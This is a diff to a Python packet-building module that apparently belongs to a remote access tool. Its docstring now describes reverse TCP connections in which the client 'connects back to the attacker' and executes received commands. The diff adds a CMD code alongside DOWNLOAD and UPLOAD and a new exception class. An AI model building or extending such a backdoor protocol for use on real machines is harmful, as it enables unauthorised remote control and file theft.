@@ -4,13 +4,15 @@
 The protocol module.
 ======================
 
-The module to create protocol messages. A message is basically composed
-of a code, the message content and aditional parameters.
+The module to create protocol messages. A message is basically composed of a code, 
+the message content and aditional parameters. The protocol is designed for reverse tcp connections, 
+where the client connects back to the attacker and acts like a server, receiving messages, executing
+and sending the proper response. 
 
 :Example:
 
 >> import protocol
->> packet = protocol.build_packet(MSG, 'Hello World', {'python': True})
+>> packet = protocol.build_packet(CMD, 'Hello World', {'python': True})
 b'\x07\r\nHello World\r\npython=True\r\n\r\n'
 
 Create a raw message with aditional parameters.
@@ -36,10 +38,9 @@ NULL         = '\x00'
 
 # Request codes.
 GET_INFO     = '\x01'
-PWD          = '\x03'
 DOWNLOAD     = '\x05'
 UPLOAD       = '\x06'
-MSG          = '\x07'
+CMD          = '\x07'
 
 # Response codes.
 SUCCESS_CODE = '\x02'
@@ -106,7 +107,7 @@ def build_packet(code, content=None, params={}):
     :return: The data encoded.
     """
     if not __is_code_valid(code):
-        raise TypeError('Invalid code for packet.')
+        raise InvalidPacketCode(code)
 
     # Parse params as HTTP query string.
     params = urllib.parse.urlencode(params)
@@ -155,7 +156,7 @@ def __is_code_valid(code):
     :param code: The code.
     :return: A boolean indicating validation.
     """
-    return code in [GET_INFO, PWD, DOWNLOAD, UPLOAD, MSG, SUCCESS_CODE, ERROR_CODE]
+    return code in [GET_INFO, DOWNLOAD, UPLOAD, CMD, SUCCESS_CODE, ERROR_CODE]
 
 class MalformedPacketException(Exception):
     def __init__(self, message):
@@ -163,3 +164,10 @@ class MalformedPacketException(Exception):
 
     def __repr__(self):
         return str(self.message)
+
+class InvalidPacketCode(Exception):
+    def __init__(self, code):
+        self.code = code
+
+    def __repr__(self):
+        return 'Invalid code for packet. Code given: {}'.format(self.code)
